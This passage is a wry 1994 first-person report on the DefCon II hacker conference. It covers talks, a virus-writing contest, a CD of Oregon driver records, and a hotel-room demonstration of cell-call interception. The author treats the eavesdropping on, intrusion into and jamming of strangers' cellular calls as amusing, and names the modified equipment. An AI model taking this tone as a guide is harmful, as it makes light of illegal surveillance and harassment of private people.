       and you're scared of losing.  This kind of puke scum you're vomiting disgusts me.  I just can't take 
       it any more. " Yeah, right on.  Scattered applause.  While this 'gent' may have stated what was on 
       many minds, his manner was most unbefitting a conference and indeed, even DefCon II.  This was 
       too rude even for a hacker get-together.  The man with the overbearing comments sat down 
       apologizing. "She just gets me going, she really does.  Really pisses me off when she goes on like 
       about how clean the Feds are.  She knows better than to run diarrhea of the mouth like that." 
        
       "You know," she continued.  "Right across the street is a Spy Shop.  One of those retail stores 
       where you can buy bugs and taps and eavesdropping equipment?"  The audience silently nodded.  
       "We as law enforcement are prohibited by law from shopping there and buying those same things 
       anyone else can.  We're losing on that front."  Cheers. Screw the Feds. 
        
       I don't agree with ever thing that Gail says, but she is a compelling speaker; she believes in what 
       she says.  But I do agree with her on the difficulty of forensic evidence in computer cases."  
       "I got really mad," she said.  "I was reading a magazine and there was an ad for United, you 
       know, the employee owned airline.  And it was a beautiful ad, hundred of employees standing in 
       front of a brand new great big jet. All smiling and happy." Gail then frowned deeply.  "Some 
       stockholder ought to sue them for misleading advertising."  This was more like it!  Go, Gail! "I 
       started to look at the picture carefully and I noticed this unmistakably fat lady in a pink dress.  
       And then over a few persons. . .guess what? The same fat lady in pink."  Roars of laughter and 
       applause.   
        
       Her point? What seems real may not be real at all, and with a few hundred dollars in software and 
       a little practice, most anyone can build a false reality digitally.   
        
       Her time was up but the audience wanted more.  She was mobbed for eternity by hackers who 
       fight her tooth and nail but respect her comportment enough to make the disagreements lively, 
       partisan, entertaining, but with respect.  Respectful hackers.  No HoHoCon orgies; merely verbal 
       barbs with no solution. Everyone knew that, but it's the battle that counts. 
        
       More security conference should be this open, this honest and informative, with all kinds of 
       people with all kinds of opinions.  That is how we, and I, learn.  Listen and learn. And all for 
       $5000 no less, plus a paltry $15 entrance fee.

       The afternoon sessions were filled with a mixture of anti-government, pro-privacy advocacy, virus 
       workshops and such by both under and above ground folks.  Padgett Peterson's knowledge of 
       viruses is deep and he spread the same wisdom as his does in so called legitimate circles.  
       Knowledge is knowledge, and better accurate than wrong. 
        
       It's often surprising to see how people will voice the same opinion in varying degree of intensity 
       depending upon their audience.  Mark Aldrich of General Research Corp. in the Washington area 
       made a statement that I doubt I would hear at a ConCon. "Fear your government that fears your 
       crypto. Use crypto as weapon."  Sara Gordon's panel discussion on crypto and privacy and related 
       topics fueled the audience's general anti-fed attitude. 
        
       "I was bugged by the Feds."  "So was I?"  "What can we do about it."  "Yeah, they listen in on my 
       phones, too.  I can hear the clicks."  Right. 
        
       As Mark so succinctly put it, "if the government wants to bug you, you'll never know.  They're 
       that good.".  That kind of shut up the dilettante paranoids in the group, albeit mumbling that they 
       just knew that they were the victim of one of the 900 or so court approved wire taps last year.  
       Right.  I think Gail was  right: some of you guys are too boring to be believed. 
        
       The afternoon edition of the Spot A Fed contest took us on the run. I actually succombed to their 
       enthusiasm and the lack of mybetter judgement and followed a group of 8 or 10 to unmask an 
       unmarked white van in the parking lot.  
        
       "It's the Feds." "How do you know?"  "Oh, it's the Feds alright."  "How do you know."  "It's a 
       white van and the intelligence services use white vans."  "What are you going to do?"  "Bust 'em."  
       "Bust 'em for what?"  "For being Feds."   
        
       This motley crew traipsed through the mile long casino, trodding upon the ugly tartan/paisley 
       carpets so obnoxiously loud a blind man could cry "Uncle!", into the Hall of  Overpriced Shoppes 
       through the lobby and over to the parking garage.  We had to have $100,000 of surveillance gear 
       in tow: (enough to detect the plant Pluto fart in b-flat),  Radio receivers and eavesdropping 
       equipment were courtesy of my pal Mike Peros. The goal was, if this was a Fed van, we could 
       hear it.  I don't think so, but I go for the ride and a few minutes of reprieve away from the 
       conference hall.  
        
       As we near, the excitement grows among the more paranoid who are trying to instill their own 
       mental foibles into their companions and sheer terror in normal old Vegas visitors who have no 
       idea what they've walked into. 
        
       Feds? Not. Surrepticious radio transmissions?  Just hotel security tracking the movements of 8 or 
       10 paranoids (and one writer with nothing else todo for a half hour) into a parking garage which 
       has more cameras than NBC.  Feds?  Of course not.  Don't be ridiculous.

       To say nothing worthwhile occurred until 11PM that evening would be lying, but this thing, this 
       DefCon II thing, was turning into what I would have called 25 years ago, a Love-In.  The 
       participants were giddy from the event, the camaraderie, the $1 Heinekens and the hacking.  The 
       Sahara  was actually pretty good about it. Jeff got the conference space for free because he 
       guaranteed that at least 100 hotel rooms would be booked by "computer enthusiasts coming to a 
       small computer conference."  Little did the hotel know that half the crowd was too young to 
       drink, to broke to gamble, and conspicuous enough to ward off legitimate clients.  But a deal's a 
       deal. 
        
       The hotel operators went out of their way and allegedly gave the hackers permission to hack 
       through the PBX in order to provide a SLPP connection.   
        
       "Just put it back the way you found it when you're done," was the hotel's only and quite 
       reasonable request. 
       In my day an equivalent event producing an equivalent social non- drug induced high would have 
       been achieved by tossing a Frisbee to Grace Slick (Lead singer Jefferson Airplane) and have her 
       throw it back. We didn't have the kind of technology that today's rebellious age has.  We had the 
       Beatles and Jimi Hendrix, safe sex (kinda), safe drugs (well, maybe a little safer) and a cause.  But 
       no technology to speak of. 
        
       When I was on the publishing staff of the New York City Free Press in 1968/9 we wrote our anti-
       establishment diatribes by hand.  By hand! And then we went down to a dark office late at night 
       to use their typesetting gear when it was idle.  It took no more than a blushing glance around the 
       room to realize that we impressionable teens were publishing our political extremisms on 
       equipment courtesy of Al Goldstein and Screw magazine.  Now that was an education.   
        
       DefCon II was a Love-In, technology and all.   
        
       Come 11PM yet another speaker canceled and I offered to chat to the crowd for a half hour or so 
       on Van Eck radiation; the emissions from CRT's that make video screens readable from a 
       distance.  Now this wasn't a fill in at 5PM or anything.  Sessions reconvened at 11PM and I spoke 
       to a full audience who were there to get a midnight lesson in cellular hacking. 
        
       Most above ground types still believe that hacking is an acne- faced teenager, sucking on Jolt 
       Cola, wolfing down pepperoni pizza and causing Corporate America no end of grief.  To a certain 
       extent some of this is true.  But hacking is so much more. 
        
       As Rop Gongrijjp, editor of Hacktic once told me, "hacking is disrespect of technology."  It's 
       going the extra mile to find out how things work.  Many of the older hackers, those in their early 
       20's and older, are migrating from the conventional dial-em-up and break-in hacking image to the 
       fine art of cellular hacking. How do these things work?  What are the frequencies? How can I 
       customize my phone?  How many channels can I scan?  The possibilities are endless as I soon 
       learned. 
        
       Jim and Bill (fake names) asked if I wanted to see a great demo. Sure!  No names, they said.  OK.  
       No problem.  In one of the several thousand hotel rooms at the Sahara was a pile of equipment to 
       make an under budgedted FBI surveillance team insanely jeaous. There in the middle of the 
       ridiculously filthy room that no doubt caused the maid to shudder, sat a log periodic antenna 
       poised atop a strong and highly adjustable photographic-style tripod.  Feeding the antenna was a 
       hunk of coax attached to a cell phone's antenna jack. 
        
       OK, so that's that?  Free cell calls?  No, much more. 
        
       A second cell phone/scanner, an Oki 900 was modified and connected to a laptop computer.  
       (This was the exact modification being discussed downstairs)  Custom software that was freely  
       distributed around DefCon scanned the data from the Oki and displayed the scanning activity. A 
       pair of speakers then audibly broadcast the specific conversation.  And in Vegas, you can imagine 
       what was going over the open airwaves! 
        
       A half dozen 'kids' sat around enthralled, each begging for his turn to, as Jim put it, "harass 
       cellular users. Ppure and simple. Harassment. Stomp on the son of a bitch,"  he laughed, joined in 
       by the others.  
        
       When a 'good' conversation was detected, they entered the channel into the broadcasting cell 
       phone and spoke.  And talk they did. Essentially they turned 'private' conversations into wide-
       band free-for-alls.  If they spoke for only a few seconds one or both of the parties could hear what 
       was being said.  If they talked for too long, the overpowering signal from the antenna would 
       literally wipe out the chat: the cell switch reacted with an internal signal to shut down. Stomping, 
       they called it.   
        
       For those on the receiving end of the harassment, it must have sounded like the overbearing voice 
       of God telling Noah how to build the Ark. 
        
       "Noah?" 
        
       "Who dat? 
        
       "Noah?" 
        
       "Who is that?" 
        
       What terror lurks in the minds of boys . . . 
        
       For those old enough to remember, stomping is no more a stunt than putting a 500 watt linear 
       power amplifier on a CB radio and blasting nearby CB's to kingdom come.  The truckers used to 
       do it to 4-wheelers. When the police began monitoring CB channels "to protect and serve" they 
       became the target of CB stomping.  So what else is new?   
        
       I gotta give it to them: these characters designed and built the software, modified the phones and 
       put it all together and it works!  Not bad on a $3 allowance and a 10th grade education.  Now, I 
       guess what they did may have been sort of illegal, or at least highly unethical and definitely, not 
       nice. But I have to admit, some of what I witnessed was very, very, funny. I'm not advocating this 
       kind of activity, but much like Candid Camera broke in to people's lives to capture their reactions, 
       cellular hacking is similarly amusing.   The hacker/phreaks particularly enjoyed breaking in on 
       fighting couples.  (I counted six impending divorces.) Almost without exception the man was in a 
       car and the lady was at a fixed location; presumably, home.  
        
       Him: "Where the hell have you been." 
       Her:  "Nowhere." Him: "Bullshit. 
       Her: "Really honey . . ."  Defensively. 
       Him: "Who's with you?"  Intense anger. 
       Hacker: "Don't believe her.  She's a whore." 
       Him: "What was that?" 
       Her: "What?" 
       "That voice." 
       "What voice?" 
       Hacker: "Me you asshole. Can't you see she's playing you for a fool." 
       "I know she is."  He agrees. 
       "What's that honey?"   
       "I know he's there with you." 
       "Who?" Incredulous. 
       "Him . . . whoever you're fucking when I'm at work."  
       Hacker: "Yeah, it's me." 
       "Shit! Who the fuck is there?" 
       "No one!" 
       "I can hear him, he's there.  You're both making fun of me . . ." 
       Hacker: "She's laughing at you, man." 
       "No shit.  Who the fuck are you?" 
       Hacker: "The guy who takes care of her when you can't, asshole." 
       "That's it."  Click. 
        
       Drug dealers aren't immune to these antics. 
        
       "Where's the meet?" 
       "By the 7/11 on Tropicana." 
       "You got it?" 
       "You got the cash?" 
       "Yeah, dude." 
       "Be sure you do." 
       Hacker: "He doesn't have the cash my man.  He's gonna rip you off." 
       "What?"  "What?"  Both sides heard the intruder's voice.  "Who is that?" 
       "What's that about a rip-off?" 
       "This ain't no rip-off man." 
       Hacker: "Yes it is. Tell 'em the truth. You gonna take his drugs and shoot his ass. Right?  Tell 
       'em." 
       "You gonna rip me off?" 
       "No, man!" 
       "Your homeboy says you gonna try and rip me off?" 
       "What home boy?" 
       Hacker: "Me, you bozo drug freak. Don't you know that shit can kill you?" 
       Click. 
        
       Good samaritanism pays off upon occasion. 
        
       "Honey, hurry up." 
       "I'm on the freeway.  I'm coming." 
       Hacker: "He's late.  Let's save her ass." 
       "What was that?"  "What did you say honey?" 
       "He said he was going to save your ass." "Who did?" 
       "The guy on the radio."  (Technical ignorance abounds.) 
       Hacker: "Me.  You're late and she's scared so we're gonna beat you there and make her safe." 
       "Who the hell is that?"  "Who?" "The guy with you?"  "There's no one here." "He says he's gonna 
       beat me there and pick you up." 
       Hacker: "Damn right we are." 
       "Hey, this is cool.  Who's there?" 
       Hacker: "Cyber Christ talking to you from Silicon Heaven." 
       "No shit.  Really?" 
       Hacker: "Yeah, (choke, choke,) really." 
       "What's happening, honey." 
       "I don't know, for sure.  He says it's God." 
       "God!?!?" 
       Hacker: "Close enough.  Listen, you sound alright.  Go get your woman, man  Keep her safe." 
       "No problem.  Uh, thanks." 
       Click. 
        
       Around 4AM, I guess it was, the hacker/phreaks definitely helped out law enforcement.  One end 
       of the conversation was coming from inside a hotel, maybe even the Sahara. The other from 
       another cell phone, most likely in the lobby.  
        
       "What do you look like?" 
       "I'm five foot nine, thinning brown hair and 180 pounds  I wear round glasses and  . ." 
       "I get the idea. Where are you now?" 
       "I'm coming down the elevator now.  What do you look like?"   
       "I'm six foot one in my heels, have long blond spiked hair and black fishnet stockings." 
       Hacker: "Don't go man.  It's a bust." 
       "What?" he said. 
       Hacker: "Don't go, it's a bust. You don't want your name in the papers, do ya?" 
       "What the fuck?" she yelled. 
       "There's a guy who says this is a bust?" 
       "Bust? What bust?" 
       Hacker: "That's the clue, man.  She's denying it.  Of course it's a bust.  Is it worth a night in jail to 
       not get laid?" 
       "Shit." He whispers not too quietly to another male companion.  "There's some guy on the phone 
       who says it's bust. What should we do." 
       Hacker: "I'm telling you man, don't go," 
       "This ain't worth it. I'm going back upstairs." 
       Click. 
        
       A couple of hours later the same hooker was overheard talking to one of her work mates. 
        
       "Then this asshole says it's a bust.  Cost me $300 in lost business, shit." 
       "You, too?  Same shit been going on all night long. What the fuck?" 
       Wow.  And it seems like only this morning that my toilet exploded.  
        
       * * * * * 
        
       So what's a perfectly groomed and slightly rotund 50-something convicted methamphetamine 
       dealer doing at DefCon II with hundreds of impressionable teenagers?  You might well ask.  
        
       So I'll tell you. 
        
       Sitting in yet another Saharan hell-hole of a room they unabashedly market for $55 per night I 
       encountered hackers #1 through #4 and this . . . I immediately thought, elderly gent.  He said 
       nothing and neither did I, thinking that he might have been an over aged chaperone for delinquent 
       teens or perhaps even an understanding Fed.   But the gallon jugs of whiskey was depleting itself 
       right before my eyes, as if a straw from Heaven sucked the manna from its innards.  Actually, it 
       was Bootleg. 
        
       Not bootleg liquor, mind you, but Bootleg the felonious con from Oregon.  Apparently he got 
       busted 'cause speed is and was against the law, and crank is not exactly the drug choice of maiden 
       aunts nor school marms.  "I've been a hacker longer than some of these kids have been alive. It all 
       started back in . . ."  and  Mike "Bootleg" Beketic commenced on the first of hundreds of war-
       story jail house tales to entertain him and us.  Bootleg loves a good story. 
        
        "Jail ain't so bad," he bragged with a huge whiskey smile.  "No one fucked with me.  You gotta 
       make friends early on.  Then it's OK."  Good advice, I guess.  "On parole I got slammed with a 
       year for piss that didn't pass."  Gotta be clean, my man.  Stay away from that shit.  It'll kill you 
       and your teeth will rot.  
        
       Bootleg handed me form PROB-37, (Rev. 1/94) from the United States District Court, Federal 
       Probation System.  Grins from ear to ear.  A badge of honor for villains, thieves, and scoundrels. 
       Sounds like they need their own union. 
        
       This was the official "Permission To Travel" form dated June 16, 1994 which gave Bootleg the 
       legal right to travel from Oregon to Las Vegas in the dead of the summer to attend a "computer 
       convention."   The flight times were specific as were the conditions of his freedom.  He had to 
       inform the local cops that he was in town.  In case any crimes occurred throughout the city of Las 
       Vegas during his sojourn, he was an easily identifiable suspect.   
        
       While he downed another Jack and coke I found out what Bootleg was really doing.  Despite the 
       fact that the "Federal Keep Track of a Crook Travel Form" said, "you are prohibited from 
       advertising or selling your DMV CD,"  the paranoia ran rampant through the minds of prison 
       bureaucracy was actually in this case quite correctly concerned.  
       "What's a DMV CD?" 
        
       "I'm glad you asked."  I was set up.  The edict said he couldn't sell or advertise, but there was no 
       provision stating that he couldn't answer questions from an inquiring mind. 
        
       Bootleg handed me a CD ROM: 
        
       Bootleg Presents: 
       DMV 
        
       - Over 2 Million Oregon Drivers License Records 
       - Over 3 Million Oregon License Plate Records 
        
       The inside jacket clearly stated that this information was not to be used by any creatively nefarious 
       types for any sort of personal Information Warfare tactics.  It warns, 
        
       Do not use this CD to: 
        
       - Make phony Licenses 
       - Make phony Titles 
       - Obtain phony I.D. 
       - Harass Politicians, Cops or Journalists 
       - Stalk Celebrities 
       - Get ME in trouble <G> 
        
       I can come up with at least 1001 other uses for this collection of information that the Oregon 
       authorities are none too happy about.  The ones Bootleg outlined never came into my mind.  
       (Heh!) Bootleg acquired the information legally.  State officials were kind enough to violate the 
       electronic souls of its citizens by sending Bootleg their driver's information magnetically 
       emblazoned on a 3600 foot long piece of 9 track acetate.  Now they want to change the law to 
       reflect "heart felt concern for the privacy of their citizens."  Get a clue, or if none's available, buy 
       one from Vanna.   
        
       Bootleg is moving onto the next 47 states (California and New York don't permit this kind of 
       shenanigans) shortly to make sure that everyone has equal access.  Hacking? Of course.  Bootleg 
       effectively hacked the Oregon DMV with their blessing and tax payer paid-for assistance.  
        
       Time to go back to my room while Bootleg and friends spent an evening of apparently 
       unsuccessful whoring around the Strip and Glitter Gulch. 
        
       A good time was had by all.

       Jeff Moss opened the Sunday morning session with an ominous sermon. 
       "You'll notice that the wet bar is missing from the rear?"  It had been their yetserday.  Everyone 
       turns around to look.  "I gotta pay for the damage . . . "  Jeff was not a happy camper.  "They 
       have my credit card number and it's almost full.  So cool it!" But the show must go on and we had 
       more to learn. 
        
       Next.  Anonymous mailers on the net?  Forget about it.  No such thing. Anonymous remailers, 
       even if they are in Norway or Finland or some such other country where American information 
       contraband such as child pornography is legal, are only as safe and secure as the people who run it 
        
       "The FBI can go over any time they want and look up who you are and what kinds of stuff you 
       swallow down your digital throat," one speaker announced.  Of course that's ridiculous.  The FBI 
       would have to call in the Boy Scouts or Russian Mafia for that kind of operation, but we all knew 
       that anyway.  A slight slip of the ad lib tongue.  No harm done.   
        
       I didn't know, until this Sunday, that there were actually real live versions of "Turn Up The 
       Volume" running rampant across the country, impinging their commercial-free low power radio 
       broadcasts into an electromagnetic spectrum owned and operated by the Federal Communications 
       Commission.  And, as to be expected, the FCC is trying to put this relatively harmless stations out 
       of business along with Howard Stern and Don Imus.  One would think that WABC or KLAC or 
       any other major market stations would little care if a podunk 20 watt radio station was squeezing 
       in between assigned frequencies.  And they probably shouldn't.  But, as we learned, the Military 
       lent an innocent hand.   
        
       In support of the hobbies of servicemen, a local San Francisco base commander gave approval for 
       a group of soldiers to establish a small, low power radio station for the base.  Good for morale, 
       keep the men out of the bars: you know the bit. 
        
       But the ballistic missiles went off when the nation's premier rating service, Arbitron, listed 
       KFREE as a top local station in the San Francisco market. 
        
       "What station KFREE?"  "Who the hell are they?"  "What the fuck?" 
        
       Needless to say, KFREE was costing the legitimate radio stations money because advertising rates 
       are based upon the number of listeners not up and peeing during commercials.  Since KFREE was 
       ad-free, no contest.  Arbitron assumes the rating to relect the existence of a real station - the 
       numbers are there - and the local stations call the FCC and the FCC calls the base and as quick as 
       you can scream, "Feds suck!" KFREE is off the air.   
        
       Stomp. 
        
       I was scheduled to speak today, but with the schedule seemingly slipping forward and backward 
       at random haphazard intervals, there was no telling when what would occur.  Mark Ludwig, of  
       Virus Writing Contest fame and author of the much touted "Little Black Book of Computer 
       Viruses" Virus gave a less then impassioned speech about the evils of government. 
        
       "I know most of you don't have any assets other than your computer," Ludwig said to the poverty 
       stricken masses of DefCon II.  "But you will, and you want to make sure the government doesn't 
       come crashing down around you whenever they want.  They can and will take your life away if it 
       suits them.  There is no fourth amendment.  Most search and seizures are illegal." And so it went.  
        
       "Put your money off shore, kids," said Dr. Ludwig the theoretical physicist.  "Find a good friendly 
       country will flexible banking laws and the Feds can't get you." 
        
       "And when the Fed do come for you, make sure that your entire life is on your computer.  Rip up 
       the papers after you scan them in.  Your all-electronic life cannot be penetrated - especially if you 
       get a case of the forgets.  'Oops, I forgot my password. Oops! I forgot my encryption key.  Oops! 
       I forgot my name.'" 
        
       "Even your VISA and Mastercard accounts should be from overseas.  Keep it out of the US and 
       you'll be all the better for it."  For those interested in such alternative, Ludwig recommends that 
       you call Mark Nestman: of LPP Ltd. at 800-528-0559 or 702-885-2509.  Tell him you want to 
       move your millions of rubbles and dollars and Cyber-credits overseas for safe keeping because the 
       Byzantine Police are at the front door as you speak.  Order pamphlet 103. 
         
       These are the defensive measures we can take protect ourselves against the emerging Police State.  
       But offensive action is also called for, he says.  "Help Phil Zimmerman.  Send him money for his 
       defense.  Then, laugh at the Feds!"  Ha ha ha ha.  Haha.  Hahahahahaha.  Ha! 
        
       ."When they come to the door, just laugh at them."  Haha.  Hahaha. Haha.  "No matter what they 
       do, laugh at them." Hahahahaha.   Enough of that, please.  If I laugh at 6 husky beer-bellied 
       Cyber-cops who have an arsenal of  handguns pointed at my head, they might as well send me to 
       the Group W bench to commiserate with Arlo Guthrie.  Peeing would come before laughing. But 
       then again, I'm no longer a grunged out 20 year old who can laugh in the face of  the Grim 
       Reaper.  "Yes, ossifer, sir.  I'm a cyber- crook.  I ain't laughing at you in your face, ossifer, sir . . 
       ."  I panic easily.  Kissing ass well comes from a life long success of quid pro quo'ing my way 
       from situation to situation.  
        
       "And, now," Master Mark announced, "on to the results and awards for the Annual Virus Writing 
       contest."  Ludwig seemed suddenly depressed.  "Unfortunately, we only got one legitimate entry."  
       One entry?  The media plastered his contest across the media- waves and the National Computer 
       Security Association was planning a tactical nuclear response.  One entry?  What kind of 
       subversives have 20 year olds turned into anyway?  In my day (Yeah, I'm old enough to use that 
       phrase) if we called for a  political demonstration thousands would pile through the subway 
       turnstiles to meet a phalanx of well armed police appropriately attired in riot gear.  One entry?  
       Come on X-Generation, you can do better than that?  No wonder the world's going to shit.  Don't 
       have enough trouble from the young-uns.   Sheeeeeeesssh! 
        
        Mark Ludwig's politically incorrect virus writing contest may have been a PR success but it was a 
       business abortion.  One entry. Shit.  At the NCSA meeting in Washington, rivaling factions battled 
       over how we as an association should respond.   
        
       "Hang the bastard."  "He's what's wrong with world."  "Put him in a county jail with Billy-Bob, 
       Jimmy-Ray and Bubba for a week and they'll be able to squeeze him out between the bars." 
        
       C'mon you fools! Ignore him! Ignore him! If you don't like what he has to say don't egg him on. 
       Ignore him.  You want to do what the Feds did to poor Phil Zimmerman and make him a folk 
       hero?  Turn a non-event into the lead for the evening news is not the way to make something go 
       away. I loudly advocated that he be treated as a non-entity if the goal was reduction to obscurity.   
       I was right.   
        
       Super-high priced PR and lobby firms had prepared presentation to wage an all-out attack on 
       Ludwig and his contest.  I bet! And who was going to pay for this?  Peter Tippitt of Semantech 
       ponied up what I believe amounted to $7,000 to get the pot going.  No one else made a firm 
       offer. Can't blame them cause it would have been no more effective than taking out an ad in USA 
       proclaiming that evil is bad.  The PR firm would have made their fees, the event would have made 
       even more news and Ludwig  would certainly have had to make a judgement and choose from 
       more than one entry. 
        
       But oddly enough, the one entry did not win. 
        
       The winner of the Annual Virus Writing Contest was no less than Bob Bales, Executive Director 
       of the NCSA.  Not that Bob wrote a program, but is he had, it would be called either Don 
       Quixote or Paranoia, and it would be of the human brain attacking Meme type.  The virus is a 
       software equivalent of Prozac to alleviate the suffering in middle-aged males who have no 
       purpose in life other than virus busting.   
        
       "Is Winn Schwartau here?" Mark asked the audience.   
        
       I was there. "Yo!"   
        
       "Would you tell Bob that he's won a plaque, and a $100 check and a full year subscription to the 
       Computer Virus Developments Quarterly."  I'm the technology advisor to the NCSA so it was 
       natural request.  
        
       I told Bob about his 15 minutes of fame at DefCon to which he roared in laughter.  "Good! Then 
       I won't have to subscribe myself."  
        
       I spoke next.  Jeff introduced me by saying, "Winn says he doesn't want to speak to an empty 
       room so he's gonna talk now."  Some introduction. But, what a great audience!  Better than most 
       of the security above-ground starched sphincter tight suit and tie conference audiences I normally 
       get.  But then again, I get paid handsomely to address legitimate audiences where I have to be 
       politically correct.  At DefCon, insulting people was the last thing I worried about.  It was what I 
       focused on, onstage and off. 
        
       "Hey, kid.  Did you ever land Zimmerman in bed?"   
        
       "You, you, er . . ."   
        
       "C'mon kid. Give me your best shot." 
        
       "Your mother . . ."  A crowd gathered to see what kind of repartee this little schnook could come 
       up with.  "Your mother .. ."  C'mon kid. You got it in you. C'mon.  "You, she is a  . . . uh, . . . 
       mother . . ." and he finally skulked away in sheer embarrassment.  Poor kid.  When he went to the 
       men's room, men walked out.  Poor kid.  I don't think he ever figured out it was all a put on. 
        
       The audience got it, though.  Rather than go over what I rambled about for an hour, here comes a 
       blatant plug: Go buy my new book "Information Warfare: Chaos on the Electronic 
       Superhighway."  That'll sum it up real nice and neat.  But what a great audience. Thanks. 
        
       Little did I know, though, that I was also on trial. 
        
       John Markoff of the New York Times was the first to ask, and then a couple of buddies asked and 
       then a lady asked during the Q&A portion of my ad hoc ad lib speech.  "How come you did it?"  
       Did what?  "How come you flamed Lenny DeCicco?"   
        
       It turns out that someone adapted my electronic identity and logged on to the WELL in Sausalito, 
       CA and proceeded to post a deep flame against Lenny.  Among other none-too-subtle aspersions, 
       'my' posting accused Lenny of a whole string of crimes of Information Warfare and even out and 
       out theft.  
        
       Except, it wasn't me.  I answered the lady's question with, "It wasn't me, I don't know Lenny and I 
       don't have an account on the WELL."   That satisfied everyone except for me.  What happened 
       and why?  It seems that Lenny's former partner in crime Most- Wanted on the lam federal fugitive 
       computer hacker Kevin Mitnick actually wrote and signed the letter with his initials.  Or someone 
       was spoofing him and me at the same time.  But why? And why me? 
        
       It took a couple of days after arriving home from DefCon to learn after extensive conversations 
       with the WELL that my erased account from almost two years ago and then re-erased on June 20 
       of this year was accidentally turned back on by some mysterious administrative process that I 
       cannot claim to fathom.  OK, that's what they said.   
        
       But perhaps most interesting of the entire Getting Spoofed incident was a single comment that Pei 
       Chen, sysop of the WELL said to me while I complained about how such an awful anti-social 
       attack was clearly reprehensible.  Oh, it's simple, she said. 
        
       "We have no security."  Whooaaaahhh!  The WELL? No security?  I love it.  I absolutely love it.  
       Major service provider, no security.  Go get 'em cowboy. 
        
       The only other speaker I wanted to see was Peter Beruk, chief litigator for the Software 
       Publisher's Association.  This is the Big Software Company sponsored organization which 
       attempts to privately interdict illegal software distribution as a prelude for both civil and criminal 
       prosecutions.  And with this group of digital anarchists, no less. 
        
       The SPA scrounges around 1600 private BBS's to see who's making illicit copies of  Microsoft 
       Word or Quattro For Weanies or Bulgarian for Bimbos or other legitimate software that the 
       publishers would rather receive their due income from then being stolen. 
        
       "Which boards are you on?" 
        
       "That would be telling."  Big grin and laughs. 
        
       "Is your BBS secure?"  A challenge in the making. 
        
       "Sure is." 
        
       "Is that an offer to see if we can break in?"  Challenge made. 
        
       "Ahem, cough, cough." Challenge denied. 
        
       "What name do you use on the boards?"  Idiot question that deserves an idiot answer. 
        
       "Fred."  Laughs. 
        
       "You mean you have a full time guy to download software from boards to see if it's legal or not?"  
       "Yup." 
        
       "So, you pay people to commit felonies?"  Astutely stupid question. 
        
       "We have permission." 
        
       "Why should we have to pay rip-off corporations too much money to use really shitty software?"  
       "So don't buy it." 
        
       "We don't.  It's so shitty that it's barely worth stealing." 
        
       "So don't steal it." 
        
       "Just want to check it out, dude." 
        
       "Scum sucking imperialists are making all of the money.  The software designers are getting 
       ripped off by the big software bureaucracies.  Power to the people."   Every generation goes 
       through this naively innocent berating of capitalism.  It doesn't make them Communists (in 1950 it 
       did), just not full fledged capitalist pigs themselves yet.  Soon come.  Vis a vis Ludwig's comment 
       on the asset-deprived audience.  Soon come, man. 
        
       "We go after BBS's that store illegal software." 
        
       "So you're gonna put Compuserve in jail?"  Big, big applause.   
        
       Despite the openly verbal animosity between the free-ware believers and the Chief Software Cop, 
       the spirited and entertaining disagreements maintained a healthy good natured tone that well 
       exceed Peter's time limit, as DefCon II was coming to a close.   
        
       It was time for one more stand up comedy attempt by a long haired bandanna wearing 
       hippie/hacker/phreak who was not quite up to the job. 
        
       "OK, guys.  We've had some fun at the Feds expense.  They're people, too.  So, from now on, it's 
       Hug a Fed.  Go on, find a fed and go up to him or her and big them a great big bear hug full of 
       love."  The Feds that had been busted were gone.  The ones still successfully undercover weren't 
       about to blow it for quick feel from a horny teenager. 
        
       Next.  The Cliff Stoll doll with an assortment of accessory yo- yos was a popular item. It was 
       thrown pell-mell into the crowds who leapt at it with a vengeance like a baseball bleachers section 
       awaiting the 61st home run. 
        
       "There used to be a Wife of Cliff Stoll doll, but no one's seen it in two years."  Cliff is strange.  I 
       don't know if he's that strange, but it was a funny bit. 
        
       "Then we have the LoD/MoD action figure set starring Erik Bloodaxe and Phiber Optik."  GI Joe 
       action set gone underground.  Corny, but appreciated as hundreds of bodies dove to catch the 
       plastic relics tossed from the stage. 
        
       If anything, an anti-climatic end to an otherwise highly informative and educational conference.  I 
       can hardly wait till next year when, after word gets out, DefCon III will be attended by thousands 
       of hackers and cops and narks who will try to replay  the Summer of Cyber-Love '94 for a sequel. 
        
       * * * * *  
        
       More than anything I wanted to get away from the Sahara.  Away from its nauseatingly chromatic 
       carpets, it's hundreds of surveillance cameras, and most of all, away from its exploding toilets.   
        
       We decided to play, and play we did at the new Luxor Hotel which is an amazing pyramid with 
       4000+ rooms. There are no elevators as in a pyramid 'going up' is kind of useless, so Inclinators 
       take passengers up the 30 some odd floors to hallways which ring around the impossibly huge 
       hollowed out pyramid shaped atrium. 
        
       This was play land.  And for three hours we played and played and went to dumb shows that 
       attract mid-western mamas from Benign, Ohio, alighting in Vegas  for their annual RV 
       pilgrimage. But we went and enjoyed none the less.  
        
       The "Live TV" show was anything but live except for lovely Susan who hosted us into the ersatz 
       TV station.  Her job is to look pretty, sound pretty and warm up the crowd for an over budget, 
       overproduced schmaltz driven video projection that was to make us all feel like we were on stage 
       with Dave.  Letterman, that is.  The effect does not work.  But we enjoyed ourselves, anyway. 
        
       "Everyone here on vacation?" 
        
       "No!" I yelled out.  Poor Susan was stunned.  No?  Why else would you be here? 
        
       "What are you doing?"  The TV audience of 500 was looking our way.  Between the five of us we 
       had a million dollars (give or take) of electronic wizardry stuffed around us, beneath us and in our 
       laps.   
        
       "Working." Gee, I'm quick. 
        
       "What do you do?"  Susan asked with a straight face.  I bet she expected something like gas 
       pumper, or nocturnal mortuary fornicator or 7/11 clerk. 
        
       "We're hacking for Jesus.  This is Cyber Christ!" I said pointing at Erik Bloodaxe. 
        
       Silence.  Dead silence again.  Sleep with Phil Zimmerman silence.  Except for us.  We giggled like 
       school boys.  Psyche. 
        
       "Ah, . . . that's nice." That was all she could come up with: That's nice.  So much for ad libbing or 
       deviating from the script.  But the TV audience enjoyed it.  A whole lot.  They finally figured out 
       it was put on.  Not every one from the Mid- West is as stupid as they all pretend to be. 
       Then it was time to get sick.  VR rides do me in, but not to be publicly humiliated by my 20-
       something cohorts (and Mike Peros with whom I had to travel yet another 2000 miles that night) I 
       jumped right into an F-14 simulator which rotated 360 degrees on two gimbals for an infinite 
       variety of nauseousness. 
        
       "Oh, shit!" I yelled as I propelled myself forward and around and sideways with sufficient g-force 
       to disgorge even the most delectable meal.  "Oh, shit." I had reversed the throttle and was now 
       spinning end over end backwards.  My inner ear was getting my stomach sick. "Oh, shit."  Out of 
       the corner of my eyes my four pals were doubled over in laughter.  Had I barfed yet and not 
       known it?  God, I hope not.  "Oh, shit." I came to a dead standstill, the video screen showed me 
